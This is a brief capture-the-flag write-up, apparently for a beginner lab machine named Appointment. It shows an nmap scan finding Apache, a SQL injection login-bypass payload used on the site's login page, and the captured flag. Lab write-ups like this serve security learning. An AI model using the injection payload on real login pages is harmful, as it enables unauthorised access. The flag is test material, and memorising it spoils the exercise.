# Appointment

#startingpoint #databases #apache #mariadb #php #sql #reconnaissance #sqli

`nmap` scan for port 80 shows `Apache httpd 2.4.38 ((Debian))` is running:

```
$ nmap -p80 -sC -sV 10.129.160.240
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-31 13:18 EDT
Nmap scan report for 10.129.160.240
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.50 seconds
```

Using SQLi on the login page:

```
admin' or 1=1 -- -
```

![[Pasted image 20240831182053.png]]

Flag is displayed upon entry:

```
e3d0796d002a446c0e622226f42e9672
```